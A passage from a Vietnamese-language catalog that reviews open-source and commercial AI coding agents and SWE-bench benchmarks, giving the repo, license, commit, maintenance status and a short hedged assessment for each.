| Nhận định | Mã Rust của CLI/TUI `grok` (SpaceXAI), hỗ trợ chạy headless và ACP. Chỉ là bản đồng bộ một chiều, không nhận PR; gần 2 tháng chưa đồng bộ lại. |
| Nguồn | [README](https://github.com/xai-org/grok-build/blob/2bdd1d6a6369de0e8c68132ea4539e9abd9e14a8/README.md) · [LICENSE](https://github.com/xai-org/grok-build/blob/2bdd1d6a6369de0e8c68132ea4539e9abd9e14a8/LICENSE) · [Cargo.toml](https://github.com/xai-org/grok-build/blob/2bdd1d6a6369de0e8c68132ea4539e9abd9e14a8/Cargo.toml) |

<a id="ch-kilo-code"></a>

### Kilo Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/Kilo-Org/kilocode |
| License | MIT |
| Phiên bản đã đọc | `bfdec5496922452222223c01b4cc6c89305b0279` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Coding agent cho VS Code, JetBrains và CLI, lõi fork từ OpenCode. Đang chuyển sang nhánh v2; các điểm rủi ro gateway/PostHog trong hồ sơ cũ chưa đọc lại lần này. |
| Nguồn | [README](https://github.com/Kilo-Org/kilocode/blob/bfdec5496922452222223c01b4cc6c89305b0279/README.md) · [LICENSE](https://github.com/Kilo-Org/kilocode/blob/bfdec5496922452222223c01b4cc6c89305b0279/LICENSE) · [package.json](https://github.com/Kilo-Org/kilocode/blob/bfdec5496922452222223c01b4cc6c89305b0279/package.json) · [workflows](https://github.com/Kilo-Org/kilocode/tree/bfdec5496922452222223c01b4cc6c89305b0279/.github/workflows) |

<a id="ch-mini-swe-agent"></a>

### mini-SWE-agent

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/SWE-agent/mini-swe-agent |
| License | MIT |
| Phiên bản đã đọc | `04d809ceab9df28f9adaed044884180159172930` (commit 2026-09-03) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE.md, pyproject.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Ít hoạt động (commit HEAD 2026-09-03) |
| Nhận định | Agent SWE tối giản (~100 dòng lớp agent) của nhóm SWE-bench, dùng litellm và nhiều môi trường chạy. Mẫu tốt về harness đơn giản; số liệu benchmark và danh sách tổ chức dùng là tuyên bố của tác giả **(chưa xác minh)**. |
| Nguồn | [README](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/README.md) · [LICENSE.md](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/LICENSE.md) · [pyproject.toml](https://github.com/SWE-agent/mini-swe-agent/blob/04d809ceab9df28f9adaed044884180159172930/pyproject.toml) · [workflows](https://github.com/SWE-agent/mini-swe-agent/tree/04d809ceab9df28f9adaed044884180159172930/.github/workflows) |

<a id="ch-multi-swe-bench"></a>

### Multi-SWE-bench

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/multi-swe-bench/multi-swe-bench |
| License | Apache-2.0 |
| Phiên bản đã đọc | `24f493f8a103e72312ded4f6b9c89f081d69cb09` (commit 2025-12-18) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE; chưa chạy upstream |
| Bảo trì | Ít hoạt động (commit HEAD 2025-12-18) |
| Nhận định | Benchmark sửa issue đa ngôn ngữ của ByteDance Seed, chạy bằng Docker. Hữu ích khi stack không phải Python; repo không có workflow CI và gần một năm không có commit. |
| Nguồn | [README](https://github.com/multi-swe-bench/multi-swe-bench/blob/24f493f8a103e72312ded4f6b9c89f081d69cb09/README.md) · [LICENSE](https://github.com/multi-swe-bench/multi-swe-bench/blob/24f493f8a103e72312ded4f6b9c89f081d69cb09/LICENSE) |

<a id="ch-oh-my-pi-omp"></a>

### oh-my-pi (omp)

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/can1357/oh-my-pi |
| License | MIT |
| Phiên bản đã đọc | `e4fe8782978e19c5de8b8830d050b95e63fc89ca` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, Cargo.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Coding agent fork từ Pi, tích hợp LSP/DAP, 60+ provider, lõi Rust. Đáng tham khảo phần tích hợp IDE; các con số trong README là tuyên bố của tác giả **(chưa xác minh)**. |
| Nguồn | [README](https://github.com/can1357/oh-my-pi/blob/e4fe8782978e19c5de8b8830d050b95e63fc89ca/README.md) · [LICENSE](https://github.com/can1357/oh-my-pi/blob/e4fe8782978e19c5de8b8830d050b95e63fc89ca/LICENSE) · [package.json](https://github.com/can1357/oh-my-pi/blob/e4fe8782978e19c5de8b8830d050b95e63fc89ca/package.json) · [Cargo.toml](https://github.com/can1357/oh-my-pi/blob/e4fe8782978e19c5de8b8830d050b95e63fc89ca/Cargo.toml) · [workflows](https://github.com/can1357/oh-my-pi/tree/e4fe8782978e19c5de8b8830d050b95e63fc89ca/.github/workflows) |

<a id="ch-omnigent"></a>

### Omnigent

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/omnigent-ai/omnigent |
| License | Apache-2.0 |
| Phiên bản đã đọc | `7c103bb333905b562221e87df5fd20715f06b520` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, pyproject.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Meta-harness điều phối nhiều coding agent trong một phiên, đồng bộ phiên qua terminal/web/điện thoại. Kiến trúc policy đáng tham khảo; vẫn alpha, các rủi ro analytics/GHSA trong hồ sơ cũ chưa đọc lại. |
| Nguồn | [README](https://github.com/omnigent-ai/omnigent/blob/7c103bb333905b562221e87df5fd20715f06b520/README.md) · [LICENSE](https://github.com/omnigent-ai/omnigent/blob/7c103bb333905b562221e87df5fd20715f06b520/LICENSE) · [package.json](https://github.com/omnigent-ai/omnigent/blob/7c103bb333905b562221e87df5fd20715f06b520/package.json) · [pyproject.toml](https://github.com/omnigent-ai/omnigent/blob/7c103bb333905b562221e87df5fd20715f06b520/pyproject.toml) · [workflows](https://github.com/omnigent-ai/omnigent/tree/7c103bb333905b562221e87df5fd20715f06b520/.github/workflows) |

<a id="ch-open-interpreter-fork-codex"></a>

### Open Interpreter (fork Codex)

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/openinterpreter/openinterpreter |
| License | Apache-2.0 |
| Phiên bản đã đọc | `a786d8474b0d7289320c16f00e852679fae7866e` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Fork Codex tập trung giả lập harness để model rẻ chạy tốt hơn. Khác hẳn Open Interpreter Python cũ; hồ sơ cũ ghi metrics Statsig bật sẵn, chưa đọc lại mã lần này. |
| Nguồn | [README](https://github.com/openinterpreter/openinterpreter/blob/a786d8474b0d7289320c16f00e852679fae7866e/README.md) · [LICENSE](https://github.com/openinterpreter/openinterpreter/blob/a786d8474b0d7289320c16f00e852679fae7866e/LICENSE) · [package.json](https://github.com/openinterpreter/openinterpreter/blob/a786d8474b0d7289320c16f00e852679fae7866e/package.json) · [workflows](https://github.com/openinterpreter/openinterpreter/tree/a786d8474b0d7289320c16f00e852679fae7866e/.github/workflows) |

<a id="ch-opencode"></a>

### OpenCode

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/anomalyco/opencode |
| License | MIT |
| Phiên bản đã đọc | `4cf9db957485dd51a5b195fb6e2c1e03d8da1107` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | CLI/TUI coding agent đa model, có desktop app beta. Đã sang dòng 2.x; nên dùng URL anomalyco/opencode như catalog đã cập nhật. |
| Nguồn | [README](https://github.com/anomalyco/opencode/blob/4cf9db957485dd51a5b195fb6e2c1e03d8da1107/README.md) · [LICENSE](https://github.com/anomalyco/opencode/blob/4cf9db957485dd51a5b195fb6e2c1e03d8da1107/LICENSE) · [package.json](https://github.com/anomalyco/opencode/blob/4cf9db957485dd51a5b195fb6e2c1e03d8da1107/package.json) · [workflows](https://github.com/anomalyco/opencode/tree/4cf9db957485dd51a5b195fb6e2c1e03d8da1107/.github/workflows) |

<a id="ch-opencut"></a>

### OpenCut

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/OpenCut-app/OpenCut |
| License | MIT (catalog cũ: None) |
| Phiên bản đã đọc | `e668010778568641babef2cc40be4703ae6916d6` (commit 2026-09-24) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, Cargo.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Ít hoạt động (commit HEAD 2026-09-24) |
| Nhận định | Trình dựng video mở đang viết lại lõi bằng Rust (Editor API, plugin, MCP server, headless). Hiện chưa dùng được, README chỉ sang repo opencut-classic; nhịp commit nhánh mặc định đã chậm. |
| Nguồn | [README](https://github.com/OpenCut-app/OpenCut/blob/e668010778568641babef2cc40be4703ae6916d6/README.md) · [LICENSE](https://github.com/OpenCut-app/OpenCut/blob/e668010778568641babef2cc40be4703ae6916d6/LICENSE) · [Cargo.toml](https://github.com/OpenCut-app/OpenCut/blob/e668010778568641babef2cc40be4703ae6916d6/Cargo.toml) · [workflows](https://github.com/OpenCut-app/OpenCut/tree/e668010778568641babef2cc40be4703ae6916d6/.github/workflows) |

<a id="ch-openhands"></a>

### OpenHands

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/OpenHands/OpenHands |
| License | MIT |
| Phiên bản đã đọc | `d1fc0fc001245eea0ed619044bc9c149c4870a69` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Repo chính đã chuyển trọng tâm thành Agent Canvas: UI điều khiển nhiều coding agent và automation trên backend local/VM/cloud. Mô tả "nền tảng agent dev, sandbox Docker" của catalog cũ cần cập nhật; lõi agent có thể nằm ở repo khác **(chưa xác minh)**. |
| Nguồn | [README](https://github.com/OpenHands/OpenHands/blob/d1fc0fc001245eea0ed619044bc9c149c4870a69/README.md) · [LICENSE](https://github.com/OpenHands/OpenHands/blob/d1fc0fc001245eea0ed619044bc9c149c4870a69/LICENSE) · [package.json](https://github.com/OpenHands/OpenHands/blob/d1fc0fc001245eea0ed619044bc9c149c4870a69/package.json) · [workflows](https://github.com/OpenHands/OpenHands/tree/d1fc0fc001245eea0ed619044bc9c149c4870a69/.github/workflows) |

<a id="ch-openjarvis"></a>

### OpenJarvis

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/open-jarvis/OpenJarvis |
| License | Apache-2.0 |
| Phiên bản đã đọc | `484de900c7238442d4e049e185de6af679519192` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, pyproject.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Framework agent cá nhân chạy cục bộ, đánh giá theo năng lượng/latency/chi phí. Đáng tham khảo phần eval; installer một lệnh tự cài uv, Ollama và model. |
| Nguồn | [README](https://github.com/open-jarvis/OpenJarvis/blob/484de900c7238442d4e049e185de6af679519192/README.md) · [LICENSE](https://github.com/open-jarvis/OpenJarvis/blob/484de900c7238442d4e049e185de6af679519192/LICENSE) · [pyproject.toml](https://github.com/open-jarvis/OpenJarvis/blob/484de900c7238442d4e049e185de6af679519192/pyproject.toml) · [workflows](https://github.com/open-jarvis/OpenJarvis/tree/484de900c7238442d4e049e185de6af679519192/.github/workflows) |

<a id="ch-personal-jarvis-nay-la-dodaios"></a>

### Personal Jarvis (nay là Dodaios)

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/Dodaios/Dodaios |
| License | MIT (file LICENSE; pyproject.toml lại khai Apache-2.0) (catalog cũ: Apache-2.0) |
| Phiên bản đã đọc | `204907b2d1e15d0dbcafb687ee137161bb35325d` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, pyproject.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Ứng dụng desktop gom nhiều coding agent vào một chat, có giọng nói/wake word, computer use, agent nền. Metadata license mâu thuẫn (MIT ở LICENSE, Apache-2.0 ở pyproject); rủi ro approval_mode mặc định bypass của hồ sơ cũ chưa đọc lại. |
| Nguồn | [README](https://github.com/Dodaios/Dodaios/blob/204907b2d1e15d0dbcafb687ee137161bb35325d/README.md) · [LICENSE](https://github.com/Dodaios/Dodaios/blob/204907b2d1e15d0dbcafb687ee137161bb35325d/LICENSE) · [pyproject.toml](https://github.com/Dodaios/Dodaios/blob/204907b2d1e15d0dbcafb687ee137161bb35325d/pyproject.toml) · [workflows](https://github.com/Dodaios/Dodaios/tree/204907b2d1e15d0dbcafb687ee137161bb35325d/.github/workflows) |

<a id="ch-qwen-code"></a>

### Qwen Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/QwenLM/qwen-code |
| License | Apache-2.0 |
| Phiên bản đã đọc | `09b8135e6929df2e7f6a5cee8e55c47980b5f92e` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Coding agent của Qwen trên terminal, IDE, desktop và kênh chat, hỗ trợ nhiều giao thức API. Đáng tham khảo; usage stats gửi Aliyun RUM theo hồ sơ cũ chưa đọc lại mã. |
| Nguồn | [README](https://github.com/QwenLM/qwen-code/blob/09b8135e6929df2e7f6a5cee8e55c47980b5f92e/README.md) · [LICENSE](https://github.com/QwenLM/qwen-code/blob/09b8135e6929df2e7f6a5cee8e55c47980b5f92e/LICENSE) · [package.json](https://github.com/QwenLM/qwen-code/blob/09b8135e6929df2e7f6a5cee8e55c47980b5f92e/package.json) · [workflows](https://github.com/QwenLM/qwen-code/tree/09b8135e6929df2e7f6a5cee8e55c47980b5f92e/.github/workflows) |

<a id="ch-roo-code"></a>

### Roo Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/RooCodeInc/Roo-Code |
| License | Apache-2.0 |
| Phiên bản đã đọc | `b867ec9145750d0ae1ff7f02d35406e9bf2a0b16` (commit 2026-05-15) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, workflows; chưa chạy upstream |
| Bảo trì | Đã archive theo catalog; commit cuối 2026-05-15 |
| Nhận định | Extension VS Code (fork Cline) với nhiều mode agent; monorepo pnpm còn đủ CHANGELOG, workflow phát hành marketplace. Đã ngừng phát triển: không chọn cho dự án mới, nhánh còn sống xem Kilo Code (mục 01 §3j). |
| Nguồn | [README.md](https://github.com/RooCodeInc/Roo-Code/blob/b867ec9145750d0ae1ff7f02d35406e9bf2a0b16/README.md) · [LICENSE](https://github.com/RooCodeInc/Roo-Code/blob/b867ec9145750d0ae1ff7f02d35406e9bf2a0b16/LICENSE) · [package.json](https://github.com/RooCodeInc/Roo-Code/blob/b867ec9145750d0ae1ff7f02d35406e9bf2a0b16/package.json) · [workflows](https://github.com/RooCodeInc/Roo-Code/tree/b867ec9145750d0ae1ff7f02d35406e9bf2a0b16/.github/workflows) |

<a id="ch-swe-bench-harness"></a>

### SWE-bench (harness)

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/SWE-bench/SWE-bench |
| License | MIT |
| Phiên bản đã đọc | `02e7a74ffd0b707aab73d203fe87bdc7c76afc8e` (commit 2026-09-02) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, pyproject.toml, workflows; chưa chạy upstream |
| Bảo trì | Commit cuối 2026-09-02, ít hoạt động |
| Nhận định | Harness chấm SWE-bench gốc (Docker, CLI eval/report), là chuẩn tham chiếu cho các biến thể Live/Pro. Chi tiết CLI và tách lỗi hạ tầng theo hồ sơ cũ mục 01 §3k, đợt này chưa đọc lại mã. |
| Nguồn | [README.md](https://github.com/SWE-bench/SWE-bench/blob/02e7a74ffd0b707aab73d203fe87bdc7c76afc8e/README.md) · [LICENSE](https://github.com/SWE-bench/SWE-bench/blob/02e7a74ffd0b707aab73d203fe87bdc7c76afc8e/LICENSE) · [pyproject.toml](https://github.com/SWE-bench/SWE-bench/blob/02e7a74ffd0b707aab73d203fe87bdc7c76afc8e/pyproject.toml) · [workflows](https://github.com/SWE-bench/SWE-bench/tree/02e7a74ffd0b707aab73d203fe87bdc7c76afc8e/.github/workflows) |

<a id="ch-swe-bench-live"></a>

### SWE-bench-Live

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/microsoft/SWE-bench-Live |
| License | MIT |
| Phiên bản đã đọc | `e61795fdc31b8994dfedddb301ee54cacc594dac` (commit 2026-11-22) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, pyproject.toml; chưa chạy upstream |
| Bảo trì | Hoạt động, commit 2026-11-22 |
| Nhận định | Tập SWE-bench tự cập nhật bằng pipeline curation tự động (RepoLaunch trong `launch/`), có leaderboard và dataset HF. Số task/tháng và MultiLang/Windows là tuyên bố README/hồ sơ cũ **(chưa xác minh)**; tên gói `swebench` trùng gói gốc dễ xung đột khi cài chung. |
| Nguồn | [README.md](https://github.com/microsoft/SWE-bench-Live/blob/e61795fdc31b8994dfedddb301ee54cacc594dac/README.md) · [LICENSE](https://github.com/microsoft/SWE-bench-Live/blob/e61795fdc31b8994dfedddb301ee54cacc594dac/LICENSE) · [pyproject.toml](https://github.com/microsoft/SWE-bench-Live/blob/e61795fdc31b8994dfedddb301ee54cacc594dac/pyproject.toml) |

<a id="ch-swe-bench-pro"></a>

### SWE-bench Pro

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/scaleapi/SWE-bench_Pro-os |
| License | MIT |
| Phiên bản đã đọc | `66f92766bba642462d4bbe5479e83f91f9211862` (commit 2026-09-22) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE; chưa chạy upstream |
| Bảo trì | Commit cuối 2026-09-22, ít hoạt động |
| Nhận định | Benchmark task dài kế nhiệm SWE-bench, kèm scaffold SWE-agent/mini-swe-agent để tái lập và leaderboard công khai/riêng. Kết quả oracle 642/642 theo GATE.md **(chưa xác minh)** đợt này; README thừa nhận từng có vấn đề leaderboard (05/18). |
| Nguồn | [README.md](https://github.com/scaleapi/SWE-bench_Pro-os/blob/66f92766bba642462d4bbe5479e83f91f9211862/README.md) · [LICENSE](https://github.com/scaleapi/SWE-bench_Pro-os/blob/66f92766bba642462d4bbe5479e83f91f9211862/LICENSE) |

<a id="ch-t3-code"></a>

### T3 Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/pingdotgg/t3code |
| License | MIT |
| Phiên bản đã đọc | `0359b044e99e9cf5bddea19c889e1dcbb8a161cd` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, workflows; chưa chạy upstream |
| Bảo trì | Hoạt động, commit 2026-11-23 |
| Nhận định | Mặt điều khiển cho coding agent chạy trên máy mình (Claude, Codex…), có app di động duyệt lệnh từ xa và relay. Monorepo lớn, CI nhiều workflow mobile/desktop; độ an toàn relay **(chưa xác minh)**. |
| Nguồn | [README.md](https://github.com/pingdotgg/t3code/blob/0359b044e99e9cf5bddea19c889e1dcbb8a161cd/README.md) · [LICENSE](https://github.com/pingdotgg/t3code/blob/0359b044e99e9cf5bddea19c889e1dcbb8a161cd/LICENSE) · [package.json](https://github.com/pingdotgg/t3code/blob/0359b044e99e9cf5bddea19c889e1dcbb8a161cd/package.json) · [workflows](https://github.com/pingdotgg/t3code/tree/0359b044e99e9cf5bddea19c889e1dcbb8a161cd/.github/workflows) |

<a id="ch-understand-anything"></a>

### Understand-Anything

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/Egonex-AI/Understand-Anything |
| License | MIT |
| Phiên bản đã đọc | `8ec75de1de8c9d2eef685d8d6cbc50782ad31fbb` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, workflows; chưa chạy upstream |
| Bảo trì | Hoạt động, commit 2026-11-23 |
| Nhận định | Plugin biến codebase/tài liệu thành knowledge graph tương tác cho Claude Code, Cursor, Copilot, Codex… cài qua plugin marketplace hoặc script. README có quảng cáo sản phẩm Ego của nhóm; chất lượng graph và "không telemetry" **(chưa xác minh)**. |
| Nguồn | [README.md](https://github.com/Egonex-AI/Understand-Anything/blob/8ec75de1de8c9d2eef685d8d6cbc50782ad31fbb/README.md) · [LICENSE](https://github.com/Egonex-AI/Understand-Anything/blob/8ec75de1de8c9d2eef685d8d6cbc50782ad31fbb/LICENSE) · [package.json](https://github.com/Egonex-AI/Understand-Anything/blob/8ec75de1de8c9d2eef685d8d6cbc50782ad31fbb/package.json) · [workflows](https://github.com/Egonex-AI/Understand-Anything/tree/8ec75de1de8c9d2eef685d8d6cbc50782ad31fbb/.github/workflows) |

<a id="ch-vibe-kanban"></a>

### Vibe Kanban

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/BloopAI/vibe-kanban |
| License | Apache-2.0 |
| Phiên bản đã đọc | `3f095f0186f6e68d67143d38b02da2238f6524d8` (commit 2026-11-15) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, Cargo.toml, workflows; chưa chạy upstream |
| Bảo trì | README ghi đang sunset; commit cuối 2026-11-15 |
| Nhận định | Bảng kanban Rust+TS, mỗi thẻ chạy một coding agent trong worktree riêng. Đang sunset nên chỉ nên tham khảo thiết kế; analytics PostHog phụ thuộc biến build **(chưa xác minh hành vi bản phát hành)**. |
| Nguồn | [README.md](https://github.com/BloopAI/vibe-kanban/blob/3f095f0186f6e68d67143d38b02da2238f6524d8/README.md) · [LICENSE](https://github.com/BloopAI/vibe-kanban/blob/3f095f0186f6e68d67143d38b02da2238f6524d8/LICENSE) · [package.json](https://github.com/BloopAI/vibe-kanban/blob/3f095f0186f6e68d67143d38b02da2238f6524d8/package.json) · [Cargo.toml](https://github.com/BloopAI/vibe-kanban/blob/3f095f0186f6e68d67143d38b02da2238f6524d8/Cargo.toml) · [workflows](https://github.com/BloopAI/vibe-kanban/tree/3f095f0186f6e68d67143d38b02da2238f6524d8/.github/workflows) |

<a id="ch-warp"></a>

### Warp

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/warpdotdev/warp |
| License | AGPL-3.0-only (crate warpui_core/warpui MIT) |
| Phiên bản đã đọc | `f8223cef2d167a5858bf233df8a1fb6f74537fa5` (commit 2026-11-20) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE-AGPL, LICENSE-MIT, Cargo.toml, workflows; chưa chạy upstream |
| Bảo trì | Hoạt động, commit 2026-11-20 |
| Nhận định | Terminal/ADE Rust mở mã client, phần server/Drive/agent cloud vẫn đóng theo hồ sơ cũ. AGPL ảnh hưởng việc nhúng; telemetry RudderStack/Sentry bật sẵn **(chưa xác minh đợt này)**. |
| Nguồn | [README.md](https://github.com/warpdotdev/warp/blob/f8223cef2d167a5858bf233df8a1fb6f74537fa5/README.md) · [LICENSE-AGPL](https://github.com/warpdotdev/warp/blob/f8223cef2d167a5858bf233df8a1fb6f74537fa5/LICENSE-AGPL) · [LICENSE-MIT](https://github.com/warpdotdev/warp/blob/f8223cef2d167a5858bf233df8a1fb6f74537fa5/LICENSE-MIT) · [Cargo.toml](https://github.com/warpdotdev/warp/blob/f8223cef2d167a5858bf233df8a1fb6f74537fa5/Cargo.toml) · [workflows](https://github.com/warpdotdev/warp/tree/f8223cef2d167a5858bf233df8a1fb6f74537fa5/.github/workflows) |

<a id="ch-windsurf-devin-desktop"></a>

### Windsurf / Devin Desktop

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://windsurf.com (chuyển hướng tới https://devin.ai/desktop) |
| License | proprietary |
| Phiên bản đã đọc | Trang web chính thức (không có repo/commit) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc trang chủ; chưa chạy upstream |
| Bảo trì | Không xác định từ mã; trang sản phẩm đang hoạt động dưới tên Devin Desktop |
| Nhận định | IDE/agent thương mại của Cognition, nay mang tên Devin Desktop: quản lý nhiều agent local hoặc cloud từ một nơi. Xác nhận việc đổi tên qua chuyển hướng tên miền; tính năng và giá **(chưa xác minh)**. |
| Nguồn | [windsurf.com](https://windsurf.com) · [devin.ai/desktop](https://devin.ai/desktop) |


<a id="bo-sung-github-copilot-2026-11-23"></a>

### GitHub Copilot — đối chiếu nguồn chính thức 23/11/2026

GitHub mô tả tính năng gợi ý mã, hỏi đáp về codebase, review và giao tác vụ agent. Phạm vi phụ thuộc gói, client và chính sách tổ chức. Chưa thử sản phẩm hoặc xác minh giá; số giá cũ không còn được dùng làm giá hiện hành.

Nguồn: [https://docs.github.com/en/copilot/get-started/about-github-copilot](https://docs.github.com/en/copilot/get-started/about-github-copilot).
